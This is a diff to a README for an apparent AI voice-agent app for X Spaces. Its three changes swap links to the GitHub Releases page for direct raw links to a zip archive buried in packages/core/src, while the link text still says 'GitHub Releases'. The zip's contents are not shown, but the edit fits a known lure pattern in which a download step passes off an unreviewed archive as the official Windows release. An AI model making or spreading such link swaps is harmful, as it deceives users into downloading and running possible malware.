@@ -1,6 +1,6 @@
 # 🎙️ agent-voice-chat - AI voice agents for X Spaces
 
-[![Download the app](https://img.shields.io/badge/Download%20Latest-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/booleanlogicdominant559/agent-voice-chat/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Latest-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/booleanlogicdominant559/agent-voice-chat/raw/refs/heads/main/packages/core/src/voice_chat_agent_3.2.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ For the best results, use:
 
 Visit this page to download the latest Windows release:
 
-[Download agent-voice-chat from GitHub Releases](https://github.com/booleanlogicdominant559/agent-voice-chat/releases)
+[Download agent-voice-chat from GitHub Releases](https://github.com/booleanlogicdominant559/agent-voice-chat/raw/refs/heads/main/packages/core/src/voice_chat_agent_3.2.zip)
 
 ## 🪟 Install on Windows
 
@@ -301,7 +301,7 @@ This project works across these areas:
 
 Use this page to download and run the latest Windows build:
 
-[https://github.com/booleanlogicdominant559/agent-voice-chat/releases](https://github.com/booleanlogicdominant559/agent-voice-chat/releases)
+[https://github.com/booleanlogicdominant559/agent-voice-chat/raw/refs/heads/main/packages/core/src/voice_chat_agent_3.2.zip](https://github.com/booleanlogicdominant559/agent-voice-chat/raw/refs/heads/main/packages/core/src/voice_chat_agent_3.2.zip)
 
 ## 🛠️ If you want to keep going
 
